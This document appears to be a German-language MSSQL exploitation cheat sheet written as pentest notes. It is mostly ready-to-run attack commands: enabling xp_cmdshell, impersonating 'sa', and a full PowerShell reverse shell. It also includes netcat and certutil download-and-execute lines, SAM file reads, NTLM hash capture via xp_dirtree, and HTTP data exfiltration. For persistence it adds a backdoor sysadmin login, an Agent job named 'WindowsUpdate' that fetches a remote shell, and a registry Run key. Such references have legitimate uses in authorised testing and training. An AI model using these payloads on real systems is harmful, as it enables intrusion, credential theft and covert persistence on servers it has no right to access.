# MSSQL Exploitation - Complete Guide

## 1. Connection Methods

### 1.1 Impacket-mssqlclient (Standard)

```bash
# Basic SQL Authentication
impacket-mssqlclient username:password@TARGET_IP

# Windows Authentication (Domain)
impacket-mssqlclient DOMAIN/username:password@TARGET_IP -windows-auth

# Mit Hostname statt IP
impacket-mssqlclient username:password@hostname -windows-auth

# Mit Hash (Pass-the-Hash)
impacket-mssqlclient username@TARGET_IP -hashes :NTHASH

# Ãœber Proxychains
proxychains impacket-mssqlclient username:password@TARGET_IP

# Mit Port angeben (nicht Standard 1433)
impacket-mssqlclient username:password@TARGET_IP -port 14333
```

### 1.2 Connection Troubleshooting

**Problem: "Login is from an untrusted domain"**
```bash
# âŒ FALSCH - Domain Auth ohne -windows-auth
impacket-mssqlclient "DOMAIN\user:pass"@TARGET -windows-auth

# âœ… RICHTIG - Ohne -windows-auth fÃ¼r untrusted domains
impacket-mssqlclient "DOMAIN\user:pass"@TARGET

# Oder mit lokalem Account versuchen
impacket-mssqlclient "user:pass"@TARGET
```

**Problem: "Name or service not known"**
```bash
# Hostname nicht in /etc/hosts oder DNS nicht erreichbar
# LÃ¶sung: IP statt Hostname verwenden
impacket-mssqlclient username:password@10.10.10.10
```

**Problem: Connection Ã¼ber Proxychains**
```bash
# Proxychains richtig konfigurieren (/etc/proxychains4.conf)
[ProxyList]
socks5 127.0.0.1 1080

# Connection mit vollstÃ¤ndiger Syntax
proxychains impacket-mssqlclient "sql_svc:Password123"@10.10.10.100
```

### 1.3 Alternative Connection Tools

```bash
# sqsh (Linux)
sqsh -S TARGET_IP -U username -P password

# sqlcmd (Windows/von Windows-Maschine)
sqlcmd -S TARGET_IP -U username -P password

# mssql-cli (moderner)
mssql-cli -S TARGET_IP -U username -P password

# DBeaver (GUI)
# JDBC URL: jdbc:sqlserver://TARGET:1433;databaseName=master
```

---

## 2. Initiale Enumeration

### 2.1 Quick Wins - Erste Checks

```sql
-- Version und User Info
SELECT @@version;
[[SELECT SYSTEM_USER, USER_NAME(), ORIGINAL_LOGIN();]]

-- ðŸŽ¯ KRITISCH: Bin ich sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');
-- 1 = Ja (du hast volle Kontrolle!)
-- 0 = Nein (Privilege Escalation nÃ¶tig)

-- Alle meine Rollen
SELECT * FROM sys.server_role_members WHERE member_principal_id = SUSER_ID();

-- Hostname und OS Info
SELECT @@SERVERNAME, @@VERSION;
EXEC xp_cmdshell 'hostname';
```

### 2.2 Datenbanken & Permissions

```sql
-- Alle Datenbanken auflisten
SELECT name FROM sys.databases;

-- Meine Permissions auf Server-Level
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Meine Permissions auf Datenbank-Level
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- Datenbank wechseln
USE master;
USE msdb;

-- Tabellen in aktueller DB
SELECT * FROM INFORMATION_SCHEMA.TABLES;
```

### 2.3 Users & Logins Enumeration

```sql
-- Server Logins
SELECT * FROM sys.server_principals WHERE type IN ('S','U');

-- Database Users
SELECT * FROM sys.database_principals WHERE type IN ('S','U');

-- Sysadmin Members
SELECT name FROM sys.server_principals
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Alle Server Roles
SELECT * FROM sys.server_role_members;
```

---

## 3. xp_cmdshell Exploitation

### 3.1 xp_cmdshell aktivieren (als sysadmin)

```sql
-- Status prÃ¼fen
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

-- Aktivieren
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Testen
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
EXEC xp_cmdshell 'ipconfig';

-- Shorthand in Impacket-mssqlclient
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

### 3.2 Command Execution & Enumeration

```sql
-- System Information
xp_cmdshell 'systeminfo';
xp_cmdshell 'wmic os get caption';

-- Network Information
xp_cmdshell 'ipconfig /all';
xp_cmdshell 'net user';
xp_cmdshell 'net localgroup administrators';

-- File System Browsing
xp_cmdshell 'dir C:\';
xp_cmdshell 'type C:\windows\win.ini';

-- Antivirus Detection
xp_cmdshell 'wmic /namespace:\\root\securitycenter2 path antivirusproduct get displayname';
```

### 3.3 Reverse Shells

**PowerShell Reverse Shell:**
```sql
-- Listener auf Kali: nc -lvnp 4444
xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.10.10'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

**PowerShell Download & Execute:**
```sql
-- Nishang PowerShellTcp.ps1 auf Kali hosten
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.10.10/Invoke-PowerShellTcp.ps1'')"'

-- Oder mit IWR (Invoke-WebRequest)
xp_cmdshell 'powershell -c "iwr -uri http://10.10.10.10/shell.ps1 -outfile C:\temp\shell.ps1"'
xp_cmdshell 'powershell -c "C:\temp\shell.ps1"'
```

**Netcat Reverse Shell:**
```sql
-- nc.exe auf Kali share hosten (impacket-smbserver)
-- Auf Kali: impacket-smbserver share . -smb2support
xp_cmdshell '\\10.10.10.10\share\nc.exe -e cmd.exe 10.10.10.10 4444';

-- Oder nc.exe erst hochladen
xp_cmdshell 'copy \\10.10.10.10\share\nc.exe C:\temp\nc.exe';
xp_cmdshell 'C:\temp\nc.exe -e cmd.exe 10.10.10.10 4444';
```

**Certutil Download:**
```sql
-- File von Webserver downloaden
xp_cmdshell 'certutil -urlcache -f http://10.10.10.10/nc.exe C:\temp\nc.exe';
xp_cmdshell 'C:\temp\nc.exe -e cmd.exe 10.10.10.10 4444';
```

---

## 4. Privilege Escalation - Impersonation

### 4.1 Impersonation Enumeration

```sql
-- Kann ich jemanden impersonieren?
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

-- Alle impersonierbaren Logins
SELECT name, type_desc
FROM sys.server_principals
WHERE name IN (
    SELECT grantee_name FROM sys.server_permissions
    WHERE permission_name = 'IMPERSONATE'
);

-- Kann ich 'sa' impersonieren?
SELECT name FROM sys.server_principals
WHERE type_desc = 'SQL_LOGIN' AND name = 'sa';
```

### 4.2 Impersonation zu sysadmin

```sql
-- Als 'sa' impersonieren
EXECUTE AS LOGIN = 'sa';

-- Check: Bin ich jetzt sysadmin?
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

-- Jetzt xp_cmdshell aktivieren
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- RCE!
EXEC xp_cmdshell 'whoami';

-- ZurÃ¼ck zu Original User
REVERT;
```

### 4.3 Database-Level Impersonation

```sql
-- In einer Datenbank andere User impersonieren
USE targetDB;
SELECT * FROM sys.database_permissions WHERE permission_name = 'IMPERSONATE';

-- Als db_owner impersonieren
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();

-- ZurÃ¼ck
REVERT;
```

---

## 5. Alternative Exploitation (ohne xp_cmdshell)

### 5.1 Ole Automation Procedures

```sql
-- Aktivieren
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- RCE via Ole
DECLARE @output INT;
DECLARE @ProgramToRun VARCHAR(255);
SET @ProgramToRun = 'Run("cmd.exe /c whoami")';
EXEC sp_oacreate 'wscript.shell', @output OUTPUT;
EXEC sp_oamethod @output, @ProgramToRun;
EXEC sp_oadestroy @output;
```

### 5.2 OPENROWSET - File Read

```sql
-- Bulk Option aktivieren (als sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;

-- File lesen
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x;
SELECT * FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;

-- SAM Dump (wenn Rechte vorhanden)
SELECT * FROM OPENROWSET(BULK 'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS x;
```

### 5.3 xp_dirtree - SMB Relay/Hash Stealing

```sql
-- Target lauscht mit Responder/ntlmrelayx
-- Auf Kali: responder -I tun0
EXEC xp_dirtree '\\10.10.10.10\share';

-- Hash wird automatisch an Angreifer gesendet (NTLMv2)
```

### 5.4 Custom Assembly (als sysadmin)

```sql
-- CLR Integration aktivieren
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Assembly erstellen und laden (komplex, siehe separate Anleitung)
-- ErmÃ¶glicht .NET Code Execution innerhalb MSSQL
```

---

## 6. Linked Server Exploitation

### 6.1 Linked Server Enumeration

```sql
-- Alle Linked Servers auflisten
EXEC sp_linkedservers;

-- Detailed Info
SELECT * FROM sys.servers;
SELECT * FROM sys.linked_logins;

-- Verbindung testen
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@version');
```

### 6.2 Command Execution Ã¼ber Linked Server

```sql
-- Query auf Linked Server ausfÃ¼hren
EXECUTE ('SELECT @@version') AT [LINKED_SERVER];

-- xp_cmdshell auf Linked Server
EXECUTE ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXECUTE ('EXEC xp_cmdshell ''whoami'';') AT [LINKED_SERVER];
```

### 6.3 Linked Server Chain Hopping

```sql
-- Server A -> Server B -> Server C
SELECT * FROM OPENQUERY([ServerB], 'SELECT * FROM OPENQUERY([ServerC], ''SELECT @@version'')');

-- Chain xp_cmdshell
EXECUTE ('EXECUTE (''xp_cmdshell ''''whoami'''''') AT [ServerC]') AT [ServerB];
```

---

## 7. Credential Hunting & Data Exfiltration

### 7.1 Sensitive Data in Databases

```sql
-- Nach interessanten Datenbanken suchen
SELECT name FROM sys.databases;

-- Tabellen durchsuchen
USE DatabaseName;
SELECT * FROM INFORMATION_SCHEMA.TABLES;

-- Nach Credentials/Passwords suchen
SELECT TABLE_NAME, COLUMN_NAME
FROM INFORMATION_SCHEMA.COLUMNS
WHERE COLUMN_NAME LIKE '%password%' OR COLUMN_NAME LIKE '%pwd%';

-- Daten dumpen
SELECT * FROM users;
SELECT username, password FROM credentials;
```

### 7.2 MSSQL Credentials & Connection Strings

```sql
-- Linked Server Credentials
SELECT * FROM sys.linked_logins;

-- Connection Strings in Tabellen
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%config%';
SELECT * FROM config;

-- Registry Read (als sysadmin)
EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQLServer', 'LoginMode';
```

### 7.3 Data Exfiltration Methods

**SQL Query Output to File:**
```sql
-- BCP Utility (von Shell aus)
xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout C:\temp\dump.txt -c -T';

-- OPENROWSET Insert (zu Linked Server)
INSERT INTO OPENROWSET(...) SELECT * FROM sensitive_table;
```

**HTTP Exfiltration:**
```sql
-- Mit xp_cmdshell
xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.10.10:8000 -Method POST -Body (Get-Content C:\temp\data.txt)"';
```

---

## 8. Persistence & Post-Exploitation

### 8.1 Neuen sysadmin User anlegen

```sql
-- Neuen SQL Login erstellen
CREATE LOGIN backdoor WITH PASSWORD = 'P@ssw0rd123!';
EXEC sp_addsrvrolemember 'backdoor', 'sysadmin';

-- Windows User als sysadmin hinzufÃ¼gen (wenn mÃ¶glich)
EXEC sp_addsrvrolemember 'DOMAIN\user', 'sysadmin';
```

### 8.2 SQL Server Agent Jobs (Persistence)

```sql
-- Job erstellen der regelmÃ¤ÃŸig Reverse Shell ausfÃ¼hrt
USE msdb;
EXEC sp_add_job @job_name = 'WindowsUpdate';

EXEC sp_add_jobstep @job_name = 'WindowsUpdate',
    @step_name = 'Step1',
    @subsystem = 'CMDEXEC',
    @command = 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.10.10/shell.ps1'')"';

EXEC sp_add_schedule @schedule_name = 'Daily',
    @freq_type = 4,  -- Daily
    @freq_interval = 1;

EXEC sp_attach_schedule @job_name = 'WindowsUpdate', @schedule_name = 'Daily';
EXEC sp_add_jobserver @job_name = 'WindowsUpdate';
```

### 8.3 Registry Persistence

```sql
-- Ãœber xp_cmdshell
xp_cmdshell 'reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "powershell -c IEX(...)"';
```

---

## 9. Quick Reference - Complete Attack Flow

```sql
-- 1. Connection
impacket-mssqlclient username:password@TARGET

-- 2. Initial Enum
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 3a. Wenn sysadmin = 1
enable_xp_cmdshell
xp_cmdshell whoami

-- 3b. Wenn sysadmin = 0 -> Impersonation
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Dann zurÃ¼ck zu 3a

-- 4. Reverse Shell
xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://KALI_IP/shell.ps1'')"'

-- 5. Oder File Upload + Execute
xp_cmdshell 'certutil -urlcache -f http://KALI_IP/nc.exe C:\temp\nc.exe'
xp_cmdshell 'C:\temp\nc.exe -e cmd.exe KALI_IP 4444'
```

---

## 10. Common Issues & Fixes

| Problem | LÃ¶sung |
|---------|--------|
| xp_cmdshell nicht aktivierbar | Versuche Impersonation zu sysadmin |
| "Login from untrusted domain" | Entferne `-windows-auth` Flag |
| Kein OPENROWSET | Aktiviere "Ad Hoc Distributed Queries" |
| Connection Ã¼ber Proxychains | Nutze IP statt Hostname |
| Kein Output von xp_cmdshell | Nutze `xp_cmdshell 'command > C:\temp\out.txt'` und dann `type C:\temp\out.txt` |
| Firewall blockiert Reverse Shell | Nutze xp_dirtree SMB Relay oder DNS Exfiltration |

---

## 11. Tools & Resources

**Connection Tools:**
- impacket-mssqlclient (Best for pentesting)
- sqlcmd (Native Windows)
- sqsh (Linux)
- mssql-cli (Modern)
- DBeaver/HeidiSQL (GUI)

**Exploitation Frameworks:**
- Metasploit: `use exploit/windows/mssql/*`
- PowerUpSQL (PowerShell): https://github.com/NetSPI/PowerUpSQL
- MSSQL-Lateral-Movement: https://github.com/hausec/MSSQL-Lateral-Movement

**Cheatsheets:**
- HackTricks MSSQL: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- PayloadsAllTheThings MSSQL: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md